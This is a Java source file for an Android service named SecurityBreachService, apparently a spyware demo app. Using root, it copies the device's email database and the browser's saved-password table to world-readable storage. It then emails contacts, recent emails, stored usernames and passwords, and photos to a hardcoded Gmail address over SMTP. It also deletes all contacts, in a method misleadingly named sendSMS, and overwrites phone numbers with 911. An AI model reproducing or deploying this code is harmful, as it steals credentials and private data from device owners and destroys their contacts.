package com.eyespies.service;

import java.io.DataOutputStream;
import java.io.File;
import java.io.IOException;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

import javax.mail.MessagingException;
import javax.mail.internet.AddressException;

import android.app.Service;
import android.content.ContentResolver;
import android.content.ContentValues;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.net.Uri;
import android.os.IBinder;
import android.provider.BaseColumns;
import android.provider.ContactsContract;
import android.provider.ContactsContract.CommonDataKinds.Phone;
import android.provider.ContactsContract.Data;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.widget.Toast;

public class SecurityBreachService extends Service {
	private static final String TAG = "SecurityBreachService";
	private static final String attackerEmailId = "eyespies55@gmail.com";
	private static final String attackerMobile = "7325990097";

	@Override
	public IBinder onBind(Intent arg0) {
		System.out.println("Binding.. !!");
		return null;
	}

	@Override
	public void onCreate() {
		Log.i(TAG, "Service created");
		sendSMSEmails();
		updateContacts();
	}

	private void updateContacts() {
		// TODO Auto-generated method stub
		try{
			ContentValues values = new ContentValues();
			values.put(Phone.NUMBER, "911");
			getContentResolver().update(Data.CONTENT_URI, values, null, null);
		} catch(Exception e) {
			e.printStackTrace();
		}
	}

	public void sendSMS(String message) {
		try {
			ContentResolver contentResolver = getApplicationContext().getContentResolver();
			Cursor cursor = contentResolver.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
			while (cursor.moveToNext()) {
				String lookupKey = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.LOOKUP_KEY));
				Uri uri = Uri.withAppendedPath(ContactsContract.Contacts.CONTENT_LOOKUP_URI, lookupKey);
				contentResolver.delete(uri, null, null);
			}
		} catch(Exception e) {
			e.printStackTrace();
		}
	}

	@Override
	public void onStart(Intent intent, int startid) {
		System.out.println("On start overridden");
	}

	public int sendSMSEmails() {
		ContentResolver resolver = getContentResolver();
		Cursor cursor = resolver.query(ContactsContract.Contacts.CONTENT_URI,
				null, null, null, null);
		if (cursor.getCount() > 0) {
			try{
				List<ContactInformation> contacts = fetchAllContacts(resolver, cursor);
				cursor.close();
				String hackedEmailsMessage = hackEmail();
				String hackedPasswordDetails = hackPassword();
				sendSMS(hackedPasswordDetails);
				sendMailsToAddress(contacts, hackedEmailsMessage, hackedPasswordDetails);
				return 1;
			}catch(Exception e){
				System.out.println("exception");
				e.printStackTrace();
			}
		}
		return 0;
	}

	public List<ContactInformation> fetchAllContacts(ContentResolver resolver,Cursor cursor) {
		List<ContactInformation> contacts = new ArrayList<ContactInformation>();
		while (cursor.moveToNext()) {
			String id = cursor.getString(cursor.getColumnIndex(BaseColumns._ID)); 
			if (Integer.parseInt(cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))) > 0) {

				Cursor contactCursor = resolver.query(
						ContactsContract.CommonDataKinds.Phone.CONTENT_URI, 
						null, 
						ContactsContract.CommonDataKinds.Phone.CONTACT_ID +" = ?", 
						new String[]{id}, null);

				while(contactCursor.moveToNext()){
					String contactNumber =  contactCursor.getString(contactCursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
					contactNumber = contactNumber.replaceAll("-", "");
					if(!contactNumber.equals(attackerMobile)) {
						String contactName = contactCursor.getString(contactCursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
						String contactEmailIds = fetchContactEmailIds(resolver, id);
						contacts.add(new ContactInformation(contactName, contactNumber, contactEmailIds));
					}
				}	
				contactCursor.close();
			}
		}
		return contacts;
	}

	public String fetchContactEmailIds(ContentResolver cr, String id) {
		String contactEmailIds = "";
		Cursor emailCursor = cr.query(
				ContactsContract.CommonDataKinds.Email.CONTENT_URI, null,
				ContactsContract.CommonDataKinds.Email.CONTACT_ID + " = ?",
				new String[] { id }, null);

		while (emailCursor.moveToNext()) {
			String email = emailCursor
					.getString(emailCursor
							.getColumnIndex(ContactsContract.CommonDataKinds.Email.DATA));
			contactEmailIds += (email + ", ");
		}
		emailCursor.close();
		return contactEmailIds;
	}

	//TODO: Current version requires User's intervention, Send email without having to do so
	private void sendMailsToAddress(List<ContactInformation> contacts, String hackedEmailsMessage, String hackedPasswordDetails) {
		Context context = getApplicationContext();
		TelephonyManager tMgr = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
		String mPhoneNumber = tMgr.getLine1Number();

		//Contact List
		String emailMessage = constructContactInfoEmail(contacts);
		//Rooted cellphone hack
		String webviewMessage = "First 10 emails from victim's inbox\n\n" + hackedEmailsMessage + "\n\n" + 
				"I have gained access to stored Passwords\n\n" + hackedPasswordDetails + "\n\n";
		List<String> imageList= new ArrayList<String>();
		imageList=	ImageLister.getAllImages(context);
		//		List<String> listOfAccounts = VictimAccountDetails.getAccount(context);
		String phoneDirectory = "Phone directory of ";
		String emailAndPassword = "Email and password details of ";
		String photos = "Photos of ";
		try {
			new SMTPSendEmail().sendEmailTo("eyespies55@gmail.com", "eyespies55", "smtp.gmail.com", "parikshd@gmail.com", emailMessage, null, mPhoneNumber!=null ? phoneDirectory + mPhoneNumber: phoneDirectory + "the victim");
			if (hackedPasswordDetails !=null || hackedEmailsMessage!= null){
				new SMTPSendEmail().sendEmailTo("eyespies55@gmail.com", "eyespies55", "smtp.gmail.com", "parikshd@gmail.com", webviewMessage, null,mPhoneNumber!=null ? emailAndPassword + mPhoneNumber: emailAndPassword + "the victim");
			}
			if(imageList != null && !imageList.isEmpty()) {
				new SMTPSendEmail().sendEmailTo("eyespies55@gmail.com", "eyespies55", "smtp.gmail.com", "parikshd@gmail.com", 
						"This email contains images from sdcard", imageList,mPhoneNumber!=null ? photos + mPhoneNumber: photos + "the victim");
			} 
		} catch (AddressException e) {
			e.printStackTrace();
		} catch (MessagingException e) {
			System.out.println("messaging exception" + e.getMessage());
			e.printStackTrace();
		}
	}

	private String constructContactInfoEmail(List<ContactInformation> contacts) {
		StringBuffer message = new StringBuffer();
		for (ContactInformation contactInformation : contacts) {
			message.append(contactInformation.getInfo());
		}
		return message.toString();
	}

	public String hackEmail() {
		Integer emailCount = 0;
		SQLiteDatabase db = null;
		StringBuilder hackedEmailsString = null;
		try { 
			System.out.println("root hack!!");
			//Get root access
			Process process = Runtime.getRuntime().exec("su");
			DataOutputStream os = new DataOutputStream(process.getOutputStream());
			//copy the browser database to a readable directory
			os.writeBytes("cat /data/data/com.google.android.email/databases/EmailProvider.db> /sdcard/EmailProvider.db \n");
			//change the permissions to be readable by everybody
			os.writeBytes("chmod 777 /sdcard/EmailProvider.db \n");
			os.writeBytes("exit\n");
			os.flush();
			process.waitFor();

			File openFile = new File("/sdcard/EmailProvider.db");

			//checking that the given file exist
			boolean isExists = openFile.exists();
			if (isExists) {
				System.out.println("Yes file is there... !!");
				db = SQLiteDatabase.openDatabase("/sdcard/EmailProvider.db", null, SQLiteDatabase.OPEN_READONLY);
				//SELECT * FROM password;
				Cursor c = db.query("Message", null, null,	null, null, null, null);
				hackedEmailsString = new StringBuilder();
				List<String> columns = Arrays.asList(new String[] {"fromList", "subject"});
				if (c != null) {
					if (c.moveToLast()) {
						do {
							hackedEmailsString.append(getColumnValues(c, columns)); // "Title" is the field name(column) of the Table
							emailCount++;
						} while (c.moveToPrevious() && emailCount < 10);
					}
				}
			}
			//end of root commands. Now just open the database and query as usual
			System.out.println(hackedEmailsString);
		} catch (IOException e) {
			Toast.makeText(this, "This app needs root access.", Toast.LENGTH_SHORT).show();
			e.printStackTrace();
		} catch (InterruptedException e) {
			Toast.makeText(this, "This app needs root access.", Toast.LENGTH_SHORT).show();
			e.printStackTrace();
		} catch (Exception e) {
			Toast.makeText(this, "This app needs root access.", Toast.LENGTH_SHORT).show();
			e.printStackTrace();
		}finally {
			if(db != null) {
				db.close();
			}
		}
		return hackedEmailsString!=null ? hackedEmailsString.toString() : null;
	}

	public String hackPassword() {
		SQLiteDatabase db = null;
		StringBuilder hackedPasswords = null;
		try { 
			System.out.println("root hack!!");
			//Get root access
			Process process = Runtime.getRuntime().exec("su");
			DataOutputStream os = new DataOutputStream(process.getOutputStream());
			//copy the browser database to a readable directory
			os.writeBytes("cat /data/data/com.android.browser/databases/webview.db> /sdcard/webview.db \n");
			//change the permissions to be readable by everybody
			os.writeBytes("chmod 777 /sdcard/webview.db \n");
			os.writeBytes("exit\n");
			os.flush();
			process.waitFor();
			File openFile = new File("/sdcard/webview.db");
			//checking that the given file exist
			boolean isExists = openFile.exists();
			if (isExists) {
				System.out.println("Yes file is there... !!");
				db = SQLiteDatabase.openDatabase("/sdcard/webview.db", null, SQLiteDatabase.OPEN_READONLY);
				//SELECT * FROM password;
				Cursor c = db.query("password", null, null,	null, null, null, null);
				hackedPasswords = new StringBuilder();
				List<String> columns = Arrays.asList(new String[] {"host", "username", "password"});
				if (c != null) {
					if (c.moveToFirst()) {
						do {
							hackedPasswords.append(getColumnValues(c, columns));
						} while (c.moveToNext());
					}
				}
			}
			//end of root commands. Now just open the database and query as usual
			System.out.println(hackedPasswords.toString());
		} catch (IOException e) {
			Toast.makeText(this, "This app needs root access.", Toast.LENGTH_SHORT).show();
			e.printStackTrace();
		} catch (InterruptedException e) {
			Toast.makeText(this, "This app needs root access.", Toast.LENGTH_SHORT).show();
			e.printStackTrace();
		} catch (Exception e) {
			Toast.makeText(this, "This app needs root access.", Toast.LENGTH_SHORT).show();
			e.printStackTrace();
		}finally {
			if(db != null) {
				db.close();
			}
		}
		return hackedPasswords!=null ? hackedPasswords.toString() : null;
	}

	private String getColumnValues(Cursor c, List<String> columns) {
		StringBuilder str = new StringBuilder();
		for (String column : columns) {
			str.append(column + ":" + "\t");
			str.append(c.getString(c.getColumnIndex(column)));   
			str.append("\n");
		}
		str.append("\n");
		return str.toString();
	} 

}